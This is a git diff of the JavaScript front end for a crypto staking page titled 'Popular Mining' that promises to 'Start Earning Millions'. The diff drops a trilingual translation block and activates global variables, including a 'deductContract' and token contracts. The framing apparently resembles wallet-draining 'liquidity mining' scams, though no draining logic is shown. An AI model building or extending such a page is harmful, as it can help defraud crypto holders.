@@ -17,146 +17,46 @@ const ERC20_ABI = [
     "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
-//---Language Control---
-const translations = {
-    'en': {
-        title: 'Popular Mining',
-        subtitle: 'Start Earning Millions',
-        tabLiquidity: 'Liquidity',
-        tabPledging: 'Pledging',
-        grossOutputLabel: 'Gross Output',
-        cumulativeLabel: 'Cumulative',
-        walletBalanceLabel: 'Wallet Balance',
-        accountBalanceLabel: 'Account Balance',
-        compoundLabel: '⚡ Compound',
-        nextBenefit: 'Next Benefit: 00:00:00',
-        startBtnText: 'Start',
-        pledgeAmountLabel: 'Pledge Amount',
-        pledgeDurationLabel: 'Duration',
-        pledgeBtnText: 'Pledge Now',
-        totalPledgedLabel: 'Total Pledged',
-        expectedYieldLabel: 'Expected Yield',
-        apyLabel: 'APY',
-        lockedUntilLabel: 'Locked Until',
-        claimBtnText: 'Claim'
-    },
-    'zh-Hant': {
-        title: '熱門挖礦',
-        subtitle: '開始賺取數百萬',
-        tabLiquidity: '流動性',
-        tabPledging: '質押',
-        grossOutputLabel: '總產出',
-        cumulativeLabel: '累計',
-        walletBalanceLabel: '錢包餘額',
-        accountBalanceLabel: '帳戶餘額',
-        compoundLabel: '⚡ 複利',
-        nextBenefit: '下次收益: 00:00:00',
-        startBtnText: '開始',
-        pledgeAmountLabel: '質押金額',
-        pledgeDurationLabel: '期間',
-        pledgeBtnText: '立即質押',
-        totalPledgedLabel: '總質押',
-        expectedYieldLabel: '預期收益',
-        apyLabel: '年化收益率',
-        lockedUntilLabel: '鎖定至',
-        claimBtnText: '領取'
-    },
-    'zh-Hans': {
-        title: '热门挖矿',
-        subtitle: '开始赚取数百万',
-        tabLiquidity: '流动性',
-        tabPledging: '质押',
-        grossOutputLabel: '总产出',
-        cumulativeLabel: '累计',
-        walletBalanceLabel: '钱包余额',
-        accountBalanceLabel: '账户余额',
-        compoundLabel: '⚡ 复利',
-        nextBenefit: '下次收益: 00:00:00',
-        startBtnText: '开始',
-        pledgeAmountLabel: '质押金额',
-        pledgeDurationLabel: '期间',
-        pledgeBtnText: '立即质押',
-        totalPledgedLabel: '总质押',
-        expectedYieldLabel: '预期收益',
-        apyLabel: '年化收益率',
-        lockedUntilLabel: '锁定至',
-        claimBtnText: '领取'
-    }
-};
-let currentLang = 'en';
-
-const languageSelect = document.getElementById('languageSelect');
-
-const elements = {
-    title: document.getElementById('title'),
-    subtitle: document.getElementById('subtitle'),
-    tabLiquidity: document.getElementById('tabLiquidity'),
-    tabPledging: document.getElementById('tabPledging'),
-    grossOutputLabel: document.getElementById('grossOutputLabel'),
-    cumulativeLabel: document.getElementById('cumulativeLabel'),
-    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
-    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
-    compoundLabel: document.getElementById('compoundLabel'),
-    nextBenefit: document.getElementById('nextBenefit'),
-    startBtnText: document.getElementById('startBtn'),
-    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
-    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
-    pledgeBtnText: document.getElementById('pledgeBtn'),
-    totalPledgedLabel: document.getElementById('totalPledgedLabel'),
-    expectedYieldLabel: 'Expected Yield',
-    apyLabel: 'APY',
-    lockedUntilLabel: document.getElementById('lockedUntilLabel'),
-    claimBtnText: claimBtn
-};
-
-function updateLanguage(lang) {
-    currentLang = lang;
-    languageSelect.value = lang;
-    for (let key in elements) {
-        if (elements[key] && translations[lang]?.[key]) {
-            elements[key].textContent = translations[lang][key];
-        }
-    }
-    if (claimBtn.parentNode) {
-        claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
-    }
-    // 新增：更新 modal 標題
-    if (modalTitle) {
-        modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
-    }
-    updateNextBenefitTimer();
-    console.log(`updateLanguage: Switched to language: ${lang}`);
-}
-
-
 //---Global Variables & DOM Elements---
-// (These are already declared above, but included here for completeness)
-// const connectButton = document.getElementById('connectButton');
-// const statusDiv = document.getElementById('status');
-// const startBtn = document.getElementById('startBtn');
-// const pledgeBtn = document.getElementById('pledgeBtn');
-// const pledgeAmount = document.getElementById('pledgeAmount');
-// const pledgeDuration = document.getElementById('pledgeDuration');
-// const pledgeToken = document.getElementById('pledgeToken');
-// const refreshWallet = document.getElementById('refreshWallet');
-// const walletTokenSelect = document.getElementById('walletTokenSelect');
-// const walletBalanceAmount = document.getElementById('walletBalanceAmount');
-// const accountBalanceValue = document.getElementById('accountBalanceValue');
-// const totalValue = document.getElementById('totalValue');
-// // 修改：使用 getElementById 提高穩健性
-// let grossOutputValue = document.getElementById('grossOutputValue');
-// let cumulativeValue = document.getElementById('cumulativeValue');
-// const nextBenefit = document.getElementById('nextBenefit');
-// const claimBtn = document.createElement('button');
-// claimBtn.id = 'claimButton';
-// let provider, signer, userAddress;
-// let deductContract, usdtContract, usdcContract, wethContract;
-// let stakingStartTime = null;
-// let claimedInterest = 0;
-// let pledgedAmount = 0;
-// let interestInterval = null;
-// let nextBenefitInterval = null;
-// let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
+const connectButton = document.getElementById('connectButton');
+const statusDiv = document.getElementById('status');
+const startBtn = document.getElementById('startBtn');
+const pledgeBtn = document.getElementById('pledgeBtn');
+const pledgeAmount = document.getElementById('pledgeAmount');
+const pledgeDuration = document.getElementById('pledgeDuration');
+const pledgeToken = document.getElementById('pledgeToken');
+const refreshWallet = document.getElementById('refreshWallet');
+const walletTokenSelect = document.getElementById('walletTokenSelect');
+const walletBalanceAmount = document.getElementById('walletBalanceAmount');
+const accountBalanceValue = document.getElementById('accountBalanceValue');
+const totalValue = document.getElementById('totalValue');
+// 修改：使用 getElementById 提高穩健性
+let grossOutputValue = document.getElementById('grossOutputValue');
+let cumulativeValue = document.getElementById('cumulativeValue');
+const nextBenefit = document.getElementById('nextBenefit');
+const claimBtn = document.createElement('button');
+claimBtn.id = 'claimButton';
+
+//---修改：Claim 確認 Modal 相關元素---
+const claimModal = document.getElementById('claimModal');
+const closeModal = document.getElementById('closeModal');
+const confirmClaim = document.getElementById('confirmClaim');
+const cancelClaim = document.getElementById('cancelClaim');
+const modalClaimableETH = document.getElementById('modalClaimableETH');
+const modalEthPrice = document.getElementById('modalEthPrice');
+const modalSelectedToken = document.getElementById('modalSelectedToken');
+const modalEquivalentValue = document.getElementById('modalEquivalentValue');
+const modalTitle = document.getElementById('modalTitle');
+
+let provider, signer, userAddress;
+let deductContract, usdtContract, usdcContract, wethContract;
+let stakingStartTime = null;
+let claimedInterest = 0;
+let pledgedAmount = 0;
+let interestInterval = null;
+let nextBenefitInterval = null;
+let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
+
 
 //---Helper Function: Retry DOM Acquisition---
 async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
@@ -334,7 +234,6 @@ function updateBalancesUI(walletBalances) {
         updateStatus("");
     }
 }
-
 //---Core Wallet Logic---
 async function getEthPrices() {
     try {
@@ -366,7 +265,7 @@ async function getEthPrices() {
     }
 }
 
-//--Remaining Code--
+//---Core Wallet Logic---
 async function claimInterest() {
     const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
     const claimableETH = parseFloat(claimableETHString);
